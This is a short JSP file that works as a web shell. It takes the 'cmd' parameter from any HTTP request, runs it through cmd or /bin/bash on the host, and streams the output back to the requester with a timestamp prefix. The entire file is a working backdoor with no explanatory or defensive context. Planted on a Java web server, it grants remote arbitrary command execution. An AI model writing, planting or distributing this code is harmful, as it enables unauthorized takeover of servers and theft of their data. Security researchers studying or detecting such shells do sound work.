<%@page import="java.util.*,java.io.*" contentType="text/html" %>
<%! class Test{} %>
<%

    if (request.getParameter ("cmd") != null) {
        boolean isWin = System.getProperty("os.name").toUpperCase().contains("WIN");
        String[] cmd = {isWin?"cmd":"/bin/bash",isWin?"/c":"-c",request.getParameter("cmd")};
        InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
        OutputStream outputStream = response.getOutputStream();
        int a;
        outputStream.write(String.valueOf(System.currentTimeMillis()).getBytes());
        while((a=inputStream.read())!=-1){
            outputStream.write(a);
        }
    }

%>